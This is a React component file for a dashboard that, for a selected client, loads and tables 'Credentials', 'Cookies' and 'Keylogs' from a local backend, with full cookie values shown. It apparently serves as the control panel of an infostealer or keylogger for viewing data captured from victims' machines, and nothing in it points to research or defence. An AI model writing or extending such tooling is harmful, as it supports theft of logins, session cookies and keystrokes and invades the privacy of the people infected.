import React from "react";
import { GlobalContext } from "../App";
const Monitor = () => {
  const titles = ["Credentials", "Cookies", "Keylogs"];
  const { selectedClientId } = React.useContext(GlobalContext);

  const [currentPage, setCurrentPage] = React.useState(0);

  const [data, setData] = React.useState(null);
  // set the current page from local storage
  React.useEffect(() => {
    setCurrentPage(parseInt(localStorage.getItem("currentPage")));
  }, []);
  // load data based on the current page from server (1 is /cookies)
  React.useEffect(() => {
    if (!selectedClientId) return;
    fetch(
      `http://localhost:3001/${titles[
        currentPage
      ].toLowerCase()}/${selectedClientId}`
    )
      .then((res) => res.json())
      .then((res) => {
        setData(res);
      })
      .catch((err) => {
        setData([]);
        console.error(err);
      });
  }, [currentPage, selectedClientId]);
  const pageWeights = [[], [0.5, 0.5, 1, 2, 1, 0.25, 0.25, 0.25, 0.25], []];
  const pageHeaders = [
    [],
    ["domain", "path", "name", "value", "exp", "sec", "ses", "h_o", "http"],
    [],
  ];
  return (
    <div className="flex flex-grow flex-col">
      <div className="w-full h-12 flex flex-row">
        {titles.map((title, index) => (
          <div
            key={index}
            className={`bg-blue-500 hover:brightness-125 transition-all flex-1 text-center text-white font-bold py-3 ${
              index !== 3 ? "border-r border-white" : ""
            } ${currentPage === index ? "bg-blue-700" : ""}`}
            onClick={() => {
              setCurrentPage(index);
              localStorage.setItem("currentPage", index);
            }}
          >
            {title}
          </div>
        ))}
      </div>
      <div className="flex flex-col flex-grow">
        {/* Header row */}
        <div className="flex flex-row">
          {pageHeaders[currentPage].map((header, index) => (
            <div
              key={index}
              className={`text-center font-bold py-2 border-b border-r border-black ${
                "flex-[" + pageWeights[currentPage][index] + "]"
              } min-w-0`}
            >
              {header}
            </div>
          ))}
        </div>

        {/* Data rows */}
        {data &&
          data.map((row, rowIndex) => (
            <div key={rowIndex} className="flex flex-row h-10">
              {Object.values(row).map((value, colIndex) => (
                <div
                  key={colIndex}
                  className={`text-center py-2 border-b border-r border-black ${
                    "flex-[" + pageWeights[currentPage][colIndex] + "]"
                  } min-w-0 overflow-hidden text-ellipsis`}
                >
                  {value}
                </div>
              ))}
            </div>
          ))}
        {/*
        <table className="w-full border-collapse table-fixed border-black">
          <colgroup>
            {pageWeights[currentPage].map((weight, index) => (
              <col key={index} style={{ width: `${weight}%` }} />
            ))}
          </colgroup>
          <thead>
            <tr>
              {pageHeaders[currentPage].map((header, index) => (
                <th key={index}>{header}</th>
              ))}
            </tr>
          </thead>
          <tbody>
            {data &&
              data.map((row, index) => (
                <tr key={index}>
                  {Object.values(row).map((value, index) => (
                    <td className={`overflow-hidden`} key={index}>
                      {value}
                    </td>
                  ))}
                </tr>
              ))}
          </tbody>
        </table>
        */}
      </div>
    </div>
  );
};

export default Monitor;
